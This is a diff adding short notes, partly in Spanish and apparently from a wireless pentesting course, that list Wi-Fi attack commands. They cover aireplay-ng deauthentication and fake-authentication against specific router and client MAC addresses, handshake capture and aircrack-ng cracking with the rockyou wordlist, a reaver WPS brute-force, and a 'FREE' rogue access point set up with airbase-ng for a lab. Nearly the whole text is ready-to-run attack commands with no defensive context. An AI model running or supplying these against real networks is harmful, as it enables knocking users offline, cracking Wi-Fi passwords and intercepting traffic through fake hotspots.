@@ -1,0 +1,30 @@
+aireplay-ng -0 3 -a <MAC-ADDRESS_ROUTER> -c <MAC-ADDRESS_Device> wlan0mon
+con wireshark abrir el paquete del SSID.cap 
+aircrack-ng SSID.cap -w /usr/share/wordlists/rockyou.txt
+
+
+220818airm
+
+aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0
+
+aireplay-ng -1 0 -e house -a 28:BE:9B:81:BE:86 -h E0:99:71:94:EF:A7 wlan0mon
+
+aireplay-ng -0 3 -a 28:BE:9B:81:BE:86 -c E0:99:71:94:EF:A7 wlan0mon
+
+
+
+ reaver -i wlan0mon --channel 11 -v --bssid 28:BE:9B:81:BE:86 -W -k 1
+
+aircrack-ng ssid.cap
+
+
+wifislax 
+
+GERIX tools en backtrack 
+
+
+LAB 4:
+
+airbase-ng -a AA:AA:AA:AA:AA:AA -essid "FREE" -c 6 wlan0mon
+
+apt-get install bridge-utils 
